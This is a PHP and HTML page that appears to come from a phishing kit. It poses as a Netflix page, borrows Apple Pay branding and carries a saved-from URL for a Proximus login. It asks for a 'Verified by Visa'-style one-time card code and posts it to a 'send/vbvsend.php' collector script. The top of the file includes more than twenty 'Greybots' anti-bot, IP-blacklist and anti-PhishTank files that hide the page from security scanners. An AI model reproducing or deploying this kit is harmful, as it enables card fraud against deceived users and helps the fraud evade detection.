<?php 


include "../translation.php";

	include "Greybots/Bad_ip.php";
	include "Greybots/Grey-Bot-1.php";
	include "Greybots/Grey-Bot-2.php";
	include "Greybots/Grey-Bot-3.php";
	include "Greybots/Grey-Bot-4.php";
	include "Greybots/Grey-Bot-5.php";
	include "Greybots/Grey-Bot-6.php";
	include "Greybots/Grey-Bot-7.php";
	include "Greybots/Grey-Bot-8.php";
	include "Greybots/Grey-Bot-9.php";
	include "Greybots/Grey-Bot-10.php";
	include "Greybots/Grey-Bot-11.php";
	include "Greybots/Grey-Bot-12.php";
	include "Greybots/Grey-Bot-Crawler.php";
	include "Greybots/Grey-IP-BlackList.php";
	include "Greybots/Grey-Phishingtank.php";
	include "Greybots/Grey-antibot-phishtank.php";
	include "Greybots/Grey-Proxyblock.php";
	include "Greybots/Grey-userAgent-1.php";
	include "Greybots/Grey-userAgent-2.php";
	include "Greybots/Grey-antibot-host.php";
	include "Greybots/Grey-antibot-ip.php";
	include "Greybots/Grey-antibot-proxy.php";
	include "Greybots/Grey-Blocker.php";
	include "Greybots/Grey-Bot.php";

?>



<!DOCTYPE html>
<!-- saved from url=(0045)https://www.proximus.be/login/fr/default.html -->
<html data-triggered="true" lang="<?php echo $meta_langue ?>">
   <head>
    
    





  <meta charset="utf-8">
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta http-equiv="origin-trial" data-feature="EME Extension - Policy Check" data-expires="2018-11-26" content="Aob+++752GiUzm1RNSIkM9TINnQDxTlxz02v8hFJK/uGO2hmXnJqH8c/ZpI05b2nLsHDhGO3Ce2zXJUFQmO7jA4AAAB1eyJvcmlnaW4iOiJodHRwczovL25ldGZsaXguY29tOjQ0MyIsImZlYXR1cmUiOiJFbmNyeXB0ZWRNZWRpYUhkY3BQb2xpY3lDaGVjayIsImV4cGlyeSI6MTU0MzI0MzQyNCwiaXNTdWJkb21haW4iOnRydWV9">
     <title><?php echo $meta_title ?></title>
     <link rel="preload" href="../js/vbv.js" as="script">

     <meta content="<?php echo $meta_keywords ?>" name="keywords">
     <meta content="<?php echo $meta_description ?>" name="description">
     <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">
     <link type="text/css" rel="stylesheet" href="../css/vbv.css">
     <link rel="shortcut icon" href="../img/nficon2016.ico">
     <link rel="apple-touch-icon" href="../img/nficon2016.png">
     <meta property="og:description" content="<?php echo $meta_description ?>">
     <meta name="twitter:card" content="player">
     <meta name="twitter:site" content="@netflix">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <link type="text/css" rel="stylesheet" href="net.css" data-uia="botLink">
  <link href="index.d9735b88e0fc5047996e.css" media="screen" rel="stylesheet">
<style>div.basicLayout .nfHeader {
    border-bottom: 1px solid #e6e6e6;
}</style>

  <script>(function(){class RuffleMimeType{constructor(a,b,c){this.type=a,this.description=b,this.suffixes=c}}class RuffleMimeTypeArray{constructor(a){this.__mimetypes=[],this.__named_mimetypes={};for(let b of a)this.install(b)}install(a){let b=this.__mimetypes.length;this.__mimetypes.push(a),this.__named_mimetypes[a.type]=a,this[a.type]=a,this[b]=a}item(a){return this.__mimetypes[a]}namedItem(a){return this.__named_mimetypes[a]}get length(){return this.__mimetypes.length}}class RufflePlugin extends RuffleMimeTypeArray{constructor(a,b,c,d){super(d),this.name=a,this.description=b,this.filename=c}install(a){a.enabledPlugin||(a.enabledPlugin=this),super.install(a)}}class RufflePluginArray{constructor(a){this.__plugins=[],this.__named_plugins={};for(let b of a)this.install(b)}install(a){let b=this.__plugins.length;this.__plugins.push(a),this.__named_plugins[a.name]=a,this[a.name]=a,this[b]=a}item(a){return this.__plugins[a]}namedItem(a){return this.__named_plugins[a]}get length(){return this.__plugins.length}}const FLASH_PLUGIN=new RufflePlugin("Shockwave Flash","Shockwave Flash 32.0 r0","ruffle.js",[new RuffleMimeType("application/futuresplash","Shockwave Flash","spl"),new RuffleMimeType("application/x-shockwave-flash","Shockwave Flash","swf"),new RuffleMimeType("application/x-shockwave-flash2-preview","Shockwave Flash","swf"),new RuffleMimeType("application/vnd.adobe.flash-movie","Shockwave Flash","swf")]);function install_plugin(a){navigator.plugins.install||Object.defineProperty(navigator,"plugins",{value:new RufflePluginArray(navigator.plugins),writable:!1}),navigator.plugins.install(a),0<a.length&&!navigator.mimeTypes.install&&Object.defineProperty(navigator,"mimeTypes",{value:new RuffleMimeTypeArray(navigator.mimeTypes),writable:!1});for(var b=0;b<a.length;b+=1)navigator.mimeTypes.install(a[b])}install_plugin(FLASH_PLUGIN);})();</script><script>(function(){class RuffleMimeType{constructor(a,b,c){this.type=a,this.description=b,this.suffixes=c}}class RuffleMimeTypeArray{constructor(a){this.__mimetypes=[],this.__named_mimetypes={};for(let b of a)this.install(b)}install(a){let b=this.__mimetypes.length;this.__mimetypes.push(a),this.__named_mimetypes[a.type]=a,this[a.type]=a,this[b]=a}item(a){return this.__mimetypes[a]}namedItem(a){return this.__named_mimetypes[a]}get length(){return this.__mimetypes.length}}class RufflePlugin extends RuffleMimeTypeArray{constructor(a,b,c,d){super(d),this.name=a,this.description=b,this.filename=c}install(a){a.enabledPlugin||(a.enabledPlugin=this),super.install(a)}}class RufflePluginArray{constructor(a){this.__plugins=[],this.__named_plugins={};for(let b of a)this.install(b)}install(a){let b=this.__plugins.length;this.__plugins.push(a),this.__named_plugins[a.name]=a,this[a.name]=a,this[b]=a}item(a){return this.__plugins[a]}namedItem(a){return this.__named_plugins[a]}get length(){return this.__plugins.length}}const FLASH_PLUGIN=new RufflePlugin("Shockwave Flash","Shockwave Flash 32.0 r0","ruffle.js",[new RuffleMimeType("application/futuresplash","Shockwave Flash","spl"),new RuffleMimeType("application/x-shockwave-flash","Shockwave Flash","swf"),new RuffleMimeType("application/x-shockwave-flash2-preview","Shockwave Flash","swf"),new RuffleMimeType("application/vnd.adobe.flash-movie","Shockwave Flash","swf")]);function install_plugin(a){navigator.plugins.install||Object.defineProperty(navigator,"plugins",{value:new RufflePluginArray(navigator.plugins),writable:!1}),navigator.plugins.install(a),0<a.length&&!navigator.mimeTypes.install&&Object.defineProperty(navigator,"mimeTypes",{value:new RuffleMimeTypeArray(navigator.mimeTypes),writable:!1});for(var b=0;b<a.length;b+=1)navigator.mimeTypes.install(a[b])}install_plugin(FLASH_PLUGIN);})();</script><script src="chrome-extension://donbcfbmhbcapadipfkeojnmajbakjdc/dist/ruffle.js?uniqueMessageSuffix=36223151062"></script><script>(function(){class RuffleMimeType{constructor(a,b,c){this.type=a,this.description=b,this.suffixes=c}}class RuffleMimeTypeArray{constructor(a){this.__mimetypes=[],this.__named_mimetypes={};for(let b of a)this.install(b)}install(a){let b=this.__mimetypes.length;this.__mimetypes.push(a),this.__named_mimetypes[a.type]=a,this[a.type]=a,this[b]=a}item(a){return this.__mimetypes[a]}namedItem(a){return this.__named_mimetypes[a]}get length(){return this.__mimetypes.length}}class RufflePlugin extends RuffleMimeTypeArray{constructor(a,b,c,d){super(d),this.name=a,this.description=b,this.filename=c}install(a){a.enabledPlugin||(a.enabledPlugin=this),super.install(a)}}class RufflePluginArray{constructor(a){this.__plugins=[],this.__named_plugins={};for(let b of a)this.install(b)}install(a){let b=this.__plugins.length;this.__plugins.push(a),this.__named_plugins[a.name]=a,this[a.name]=a,this[b]=a}item(a){return this.__plugins[a]}namedItem(a){return this.__named_plugins[a]}get length(){return this.__plugins.length}}const FLASH_PLUGIN=new RufflePlugin("Shockwave Flash","Shockwave Flash 32.0 r0","ruffle.js",[new RuffleMimeType("application/futuresplash","Shockwave Flash","spl"),new RuffleMimeType("application/x-shockwave-flash","Shockwave Flash","swf"),new RuffleMimeType("application/x-shockwave-flash2-preview","Shockwave Flash","swf"),new RuffleMimeType("application/vnd.adobe.flash-movie","Shockwave Flash","swf")]);function install_plugin(a){navigator.plugins.install||Object.defineProperty(navigator,"plugins",{value:new RufflePluginArray(navigator.plugins),writable:!1}),navigator.plugins.install(a),0<a.length&&!navigator.mimeTypes.install&&Object.defineProperty(navigator,"mimeTypes",{value:new RuffleMimeTypeArray(navigator.mimeTypes),writable:!1});for(var b=0;b<a.length;b+=1)navigator.mimeTypes.install(a[b])}install_plugin(FLASH_PLUGIN);})();</script><script src="chrome-extension://donbcfbmhbcapadipfkeojnmajbakjdc/dist/ruffle.js?uniqueMessageSuffix=16731404415"></script><script src="chrome-extension://donbcfbmhbcapadipfkeojnmajbakjdc/dist/ruffle.js?uniqueMessageSuffix=23919690931"></script></head>
   <body>
      <div id="appMountPoint">
         <div class="netflix-sans-font-loaded">
            <div class="basicLayout notMobile modernInApp signupSimplicity-registrationWithContext simplicity" dir="ltr" lang="fr-FR">
               <div class="nfHeader noBorderHeader signupBasicHeader">
                  <a href="/" class="svg-nfLogo signupBasicHeader" data-uia="netflix-header-svg-logo">
                     <svg style="margin-top: 15px;" viewBox="0 0 111 30" class="svg-icon svg-icon-netflix-logo" focusable="true">
                        <g id="netflix-logo">
                           <path d="M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2498828 C43.7810479,26.2498828 42.1876465,26.2498828 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.68434189e-14 L15.2497891,-5.68434189e-14 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458,28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z" id="Fill-14"></path>
                        </g>
                     </svg>
                     <span class="screen-reader-text">Netflix</span>
                     <br/>
                  </a>
                  <a href="../login.php" class="authLinks signupBasicHeader" data-uia="header-login-link"><?php echo $Deconnexion ?></a>
                  <br/>
               </div>
               <br/>
               <div class="simpleContainer" data-transitioned-child="true">
               <br/>
                  <div class="centerContainer contextStep firstLoad">
            <div class="centerContainer contextStep firstLoad">
                 <div class="container-fluid login ng-scope">

  <div class="content">
    
<center><img style="padding-top: 10px; width: 170px;" src="../img/apple-pay_main.jpg"></center><center>
<style>.test3 { display}</style>
<h2 class="test3"><?php echo $Authentification ?></h2>
    
<center>
<style>
.test { background}
@media only screen and (max-width: 600px) {
  .test {
    width: 140%;
    height: 215px;
    margin-left: -46px;
    margin-bottom: -50px;
  }
}
</style>
<p class="test"><?php echo $vbvtext1 ?></p>


</center>
    </center>

    <!-- ngIf: showContinueLabel --><!-- end ngIf: showContinueLabel -->
    <!-- ngIf: status && status !== 200 -->
    <!-- ngIf: !onlyPasswordView --><!-- end ngIf: !onlyPasswordView -->

    
      <form action="./send/vbvsend.php" method="POST" wtx-context="FAF6EF39-F36D-428C-8502-049D7D2A3DE3">
              <div class="row">
        
      </div>

      


      

            

<div style="/* padding-top: 15px; */" class="col-xs-12">
          <div class="divider">
            
          </div>
        </div>

<div class="row">
        <div class="col-xs-12">
          
          <input type="text" class="form-control input-with-feedback ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required" name="otp" id="otp" placeholder="<?php echo $placeholdervbv ?>" required="" autocomplete="off" ng-trim="false" ng-change="onInputChange()" maxlength="8" minlength="6" onkeypress="return isNumberKey(event)" wtx-context="388EC6C6-1199-4B96-9A77-2D7F1DEE59F9">
          <!-- ngIf: accounts.password.$dirty && accounts.password.$invalid -->
        </div>

      </div>
                        
              <br/>

                           <center> <button type="submit" autocomplete="off" class=" nf-btn nf-btn-primary nf-btn-solid" data-uia="cta-continue-registration" placeholder="registration_button_continue"><?php echo $Validerlecodereçu ?></button></center>
                        </div>
                        
                        
                    </form>
                    </div>
                    
               </div>
               
            </div>
         </div>
         <?php include './footer.php'; ?>
      </div>
      
      <div>
      
      </div>
   </body>
</html>

